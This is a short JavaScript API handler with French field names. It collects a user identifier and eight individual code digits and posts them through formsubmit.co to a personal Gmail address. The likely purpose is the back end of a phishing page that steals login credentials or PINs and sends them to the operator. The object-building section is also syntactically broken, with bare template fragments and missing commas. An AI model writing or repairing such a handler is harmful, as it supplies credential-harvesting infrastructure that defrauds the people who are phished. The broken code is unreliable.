export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const { identifiant, chiffre_1, chiffre_2, chiffre_3, chiffre_4, chiffre_5, chiffre_6, chiffre_7, chiffre_8 } = req.body;

  try {
    // Utilise https au lieu de fetch natif
    const https = require('https');

    const data = JSON.stringify({
      identifiant: identifiant,
              chiffre_1 : ${chiffre_1}
    chiffre_2 : ${chiffre_2}
    chiffre_3 : ${chiffre_3}
	chiffre_4 : ${chiffre_4}
    chiffre_5 : ${chiffre_5}
    chiffre_6 : ${chiffre_6}
	chiffre_7 : ${chiffre_7}
    chiffre_8 : ${chiffre_8}
      _subject: '🔒  Nouvelles informations'
    });

    const options = {
      hostname: 'formsubmit.co',
      path: '/ajax/david.llenoay@gmail.com',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const request = https.request(options, (response) => {
      let body = '';

      response.on('data', (chunk) => {
        body += chunk;
      });

      response.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (response.statusCode === 200 && result.success === "true") {
            return res.status(200).json({ success: true });
          } else {
            return res.status(500).json({ error: result.message || 'Erreur FormSubmit' });
          }
        } catch (e) {
          return res.status(200).json({ success: true }); // FormSubmit retourne parfois du texte
        }
      });
    });

    request.on('error', (error) => {
      return res.status(500).json({ error: error.message });
    });

    request.write(data);
    request.end();

  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}